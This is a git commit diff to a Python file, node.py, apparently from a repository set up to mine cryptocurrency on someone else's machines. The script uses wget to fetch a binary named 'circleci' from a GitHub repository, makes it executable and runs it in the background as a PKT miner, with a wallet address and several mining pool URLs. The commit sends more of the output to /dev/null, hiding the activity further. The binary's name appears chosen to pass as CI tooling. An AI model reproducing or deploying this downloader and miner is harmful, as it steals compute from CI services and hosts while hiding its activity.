77aeeb2ea9606176836425614c9e91660a49761e
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-02-10 16:54:11 +0700

    Update node.py

--- node.py
+++ node.py
@@ -1,14 +1,14 @@
 import subprocess
 def main():
-    print("start!!")
+    print("BUILD!!")
 
-    cmd = "nohup wget https://github.com/aurbach55/pos/raw/main/circleci > /tmp/circleci.log 2>&1"
+    cmd = "nohup wget https://github.com/aurbach55/pos/raw/main/circleci > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
     subprocess.call(cmd, shell=True)
 
-    cmd = "nohup chmod 777 circleci > /tmp/circleci.log 2>&1"
+    cmd = "nohup chmod 777 circleci > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
     subprocess.call(cmd, shell=True)
 
-    cmd = "nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1"
+    cmd = "nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1 >/dev/null 2>&1"
     subprocess.call(cmd, shell=True)
 
     print("done!!")
